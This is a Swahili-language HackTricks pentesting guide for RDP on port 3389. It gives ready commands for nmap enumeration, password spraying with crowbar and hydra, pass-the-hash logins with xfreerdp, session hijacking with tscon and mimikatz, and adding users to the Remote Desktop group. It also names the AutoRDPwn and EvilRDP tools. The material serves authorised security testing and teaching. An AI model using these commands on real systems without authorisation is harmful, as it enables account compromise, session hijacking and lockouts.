# 3389 - Kupima Usalama wa RDP

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Usanidi uliopo mara moja kwa ajili ya tathmini ya udhaifu na kupima usalama**. Tekeleza pentest kamili kutoka mahali popote na zana na huduma zaidi ya 20 ambazo zinaanza kutoka kwa uchunguzi hadi ripoti. Hatuchukui nafasi ya wapima usalama - tunatengeneza zana za desturi, moduli za ugunduzi na uvamizi ili kuwapa muda wa kuchimba kwa kina, kudukua na kufurahi.

{% embed url="https://pentest-tools.com/" %}

## Taarifa Msingi

Iliyoundwa na Microsoft, **Remote Desktop Protocol** (**RDP**) imeundwa kuwezesha uhusiano wa kiolesura cha picha kati ya kompyuta kupitia mtandao. Ili kuweka uhusiano kama huo, mtumiaji hutumia programu ya mteja ya **RDP**, na wakati huo huo, kompyuta ya mbali inahitaji kuendesha programu ya seva ya **RDP**. Usanidi huu unaruhusu udhibiti na ufikiaji wa laini wa mazingira ya kompyuta ya mbali, kwa kimsingi kupeleka kiolesura chake kwenye kifaa cha mtumiaji.

**Bandari ya chaguo-msingi:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## Uchambuzi

### Kiotomatiki

{% code overflow="wrap" %}
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
{% endcode %}

Inachunguza uwezo wa kusimbwa na udhaifu wa DoS (bila kusababisha DoS kwa huduma) na kupata habari za NTLM za Windows (toleo).

### [Nguvu ya nguvu](../generic-methodologies-and-resources/brute-force.md#rdp)

**Jihadhari, unaweza kufunga akaunti**

### **Password Spraying**

**Jihadhari, unaweza kufunga akaunti**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Unganisha na sifa/hash za kujulikana

Unapotaka kuingia kwenye mfumo wa RDP (Remote Desktop Protocol), njia moja ya kujaribu kuingia ni kutumia sifa au hash za kujulikana. Hii inaweza kufanyika kwa kutumia programu kama `xfreerdp` au `rdesktop`.

Kwa mfano, ikiwa unajua jina la mtumiaji na nenosiri, unaweza kutumia amri ifuatayo:

```bash
xfreerdp /u:<jina_la_mtumiaji> /p:<nenosiri> /v:<anwani_ya_IP>
```

Au, ikiwa unajua hash ya nenosiri, unaweza kutumia amri ifuatayo:

```bash
xfreerdp /u:<jina_la_mtumiaji> /pth:<hash_ya_nenosiri> /v:<anwani_ya_IP>
```

Kumbuka kuwa njia hii inafanya kazi tu ikiwa unajua sifa au hash sahihi za kuingia kwenye mfumo wa RDP.
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### Angalia vitambulisho vilivyofahamika dhidi ya huduma za RDP

rdp\_check.py kutoka impacket inakuwezesha kuangalia ikiwa vitambulisho fulani ni halali kwa huduma ya RDP:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Usanidi uliopo mara moja kwa ajili ya tathmini ya udhaifu na upimaji wa kuingilia**. Fanya pentest kamili kutoka popote na zana na huduma zaidi ya 20 ambazo zinaanza kutoka kwa uchunguzi hadi ripoti. Hatuchukui nafasi ya pentesters - tunatengeneza zana za desturi, moduli za ugunduzi na uvamizi ili kuwapa muda wa kuchimba kwa kina, kufungua kabati, na kufurahi.

{% embed url="https://pentest-tools.com/" %}

## **Mashambulizi**

### Wizi wa Kikao

Kwa **ruhusa ya SYSTEM** unaweza kupata kikao cha RDP kilichofunguliwa na mtumiaji yeyote bila haja ya kujua nenosiri la mmiliki.

**Pata vikao vilivyofunguliwa:**
```
query user
```
**Upatikanaji wa kikao kilichochaguliwa**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
Sasa utakuwa ndani ya kikao cha RDP kilichochaguliwa na utalazimika kujifanya kuwa mtumiaji kwa kutumia zana na vipengele vya Windows pekee.

**Muhimu**: Unapofikia vikao vya RDP vilivyopo, utamfukuza mtumiaji aliyekuwa akitumia.

Unaweza kupata nywila kwa kudumpisha mchakato huo, lakini njia hii ni haraka zaidi na itakuruhusu kuingiliana na desktopi za vituo vya kazi vya mtumiaji (nywila kwenye notepad bila kuokolewa kwenye diski, vikao vingine vya RDP vilivyofunguliwa kwenye mashine nyingine...)

#### **Mimikatz**

Unaweza pia kutumia mimikatz kufanya hivi:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Sticky-keys & Utilman

Kwa kuunganisha mbinu hii na **stickykeys** au **utilman utaweza kufikia CMD ya utawala na kikao chochote cha RDP wakati wowote**

Unaweza kutafuta RDP ambazo tayari zimeingiliwa na moja ya mbinu hizi kwa kutumia: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### RDP Process Injection

Ikiwa mtu kutoka kwenye kikoa tofauti au na **mamlaka bora anajisajili kupitia RDP** kwenye PC ambapo **wewe ni Msimamizi**, unaweza **kuingiza** ishara yako katika **mchakato wa kikao cha RDP** chake na kufanya kama yeye:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### Kuongeza Mtumiaji kwenye Kikundi cha RDP
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## Zana za Kiotomatiki

* [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn** ni mfumo wa baada ya udukuzi ulioandikwa kwa Powershell, ulioundwa hasa kwa ajili ya kiotomatiki cha shambulio la **Shadow** kwenye kompyuta za Microsoft Windows. Udhaifu huu (uliorodheshwa kama kipengele na Microsoft) inaruhusu mshambuliaji kutoka mbali kuona **desktop ya mwathiriwa bila ridhaa yake**, na hata kuiendesha kwa ombi, kwa kutumia zana zilizojengwa kwenye mfumo wa uendeshaji yenyewe.

* [**EvilRDP**](https://github.com/skelsec/evilrdp)
* Udhibiti wa panya na kibodi kwa njia ya kiotomatiki kutoka kwenye mstari wa amri
* Udhibiti wa ubao wa kunakili na kubandika kwa njia ya kiotomatiki kutoka kwenye mstari wa amri
* Kuzindua mtandao wa proxy wa SOCKS kutoka kwa mteja ambao unapeleka mawasiliano ya mtandao kwenye lengo kupitia RDP
* Kutekeleza amri za SHELL na PowerShell za aina yoyote kwenye lengo bila kupakia faili
* Pakia na shusha faili kwenye lengo hata wakati uhamishaji wa faili umezimwa kwenye lengo

## Amri za Kiotomatiki za HackTricks
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for RDP
Note: |
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device.

https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
Name: Nmap
Description: Nmap with RDP Scripts
Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Usanidi uliopo mara moja kwa ajili ya tathmini ya udhaifu na upenyezaji**. Tekeleza upenyezaji kamili kutoka mahali popote na zana na huduma zaidi ya 20 ambazo zinaanza kutoka uchunguzi hadi ripoti. Hatuchukui nafasi ya wapenyezaji - tunatengeneza zana za kawaida, moduli za ugunduzi na uvamizi ili kuwapa muda wa kuchimba kwa kina zaidi, kuchukua udhibiti, na kufurahia.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
